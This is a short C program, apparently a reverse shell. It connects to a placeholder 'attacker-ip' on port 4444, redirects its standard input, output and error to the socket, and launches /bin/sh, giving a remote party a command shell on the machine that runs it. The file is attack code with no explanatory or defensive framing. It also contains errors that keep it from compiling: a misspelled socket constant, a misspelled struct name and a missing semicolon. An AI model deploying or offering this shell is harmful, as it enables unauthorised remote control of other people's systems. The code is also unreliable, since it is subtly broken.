#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main () {

  // attacker IP address
  const char* ip = "attacker-ip";

  // address struct
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(4444);
  inet_aton(ip, &addr.sin_addr);

  // socket syscall
  int sockfd = socket(AF_INET, SOCKSTREAM, 0);

  // connect syscall
  connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

  for (int i = 0; i < 3; i++) {

    dup2(sockfd, i);
  }

  // execve syscall
  execve("/bin/sh", NULL, NULL);

  return 0
      
}
